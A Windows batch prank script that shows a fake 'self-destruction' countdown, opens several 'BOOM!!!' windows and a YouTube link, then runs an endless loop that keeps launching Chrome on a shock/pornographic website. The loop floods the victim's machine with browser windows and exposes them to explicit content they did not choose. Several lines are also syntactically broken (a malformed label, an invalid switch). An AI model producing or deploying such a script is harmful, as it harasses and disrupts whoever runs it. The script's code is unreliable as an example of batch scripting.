@echo off 
color 4 
echo Warning Selfdestruction will commence in 10 second(s)! 
color 0 
Choice /t 1 /d a /C a 
if "%web%"=="a" GOTO "b" 
:b 
color 4 
echo. 
echo Warning Selfdestruction will commence in 9 second(s)! 
echo. 
color 0 
choice /t 1 /d b /c b 
if "%web%"=="b" GOTO "c" 
:c 
color 4 
echo. 
echo Warning Selfdestruction will commence in 8 second(s)! 
echo. 
color 0 
choice /t 1 /d c /c c 
if "/d"=="c" GOTO "d" 
:d 
color 4 
echo. 
echo Warning Selfdestruction will commence in 7 second(s)! 
echo. 
color 0 
choice /t 1 /d d /c d 
if "%web%"=="d" GOTO "e" 
e: 
color 4 
echo. 
echo Warning Selfdestruction will commence in 6 second(s)! 
echo. 
color 0 
choice /t 1 /d e /c e 
if "%web%"=="e" GOTO "f" 
:f 
color 4 
echo. 
echo Warning Selfdestruction will commence in 5 second(s)! 
echo. 
color 0 
choice /t 1 /d f /c f 
if "%web%"=="f" GOTO "g" 
:g 
color 4 
echo. 
echo Warning Selfdestruction will commence in 4 second(s)! 
echo. 
color 0 
choice /t 1 /g g /c g 
if "%web%"=="g" GOTO "h" 
:h 
color 4 
echo. 
echo Warning Selfdestruction will commence in 3 second(s)! 
echo. 
color 0 
choice /t 1 /d h /c h 
if "%web%"=="h" GOTO "i" 
:i 
color 4 
echo. 
echo Warning Selfdestruction will commence in 2 second(s)! 
echo. 
color 0 
choice /t 1 /d i /c i 
set /p web 
if "%web%"=="i" GOTO "j" 
:j 
color 4 
echo. 
echo Warning Selfdestruction will commence in 1 second(s)! 
echo. 
color 0 
choice /t 1 /d j /c j 
set /p web 
if "%web%"=="j" GOTO "k" 
:k 
color 4 
echo. 
echo Warning Selfdestruction will commence in NOW! second(s)! 
echo. 
color 0 
choice /t 1 /d k /c k 
set /p web 
if "%web%"=="k" GOTO "l" 
:l 
color 4 
start echo BOOM!!! 
start echo BOOM!!! 
start echo BOOM!!! 
start echo BOOM!!! 
start echo BOOM!!! 
start echo BOOM!!! 
start echo BOOM!!! 
start echo BOOM!!! 
start echo BOOM!!! 
start chrome.exe http://www.youtube.com/watch?v=N1PFETbX_1U 
:loop 
start chrome.exe http://www.meatspin.com 
GOTO loop 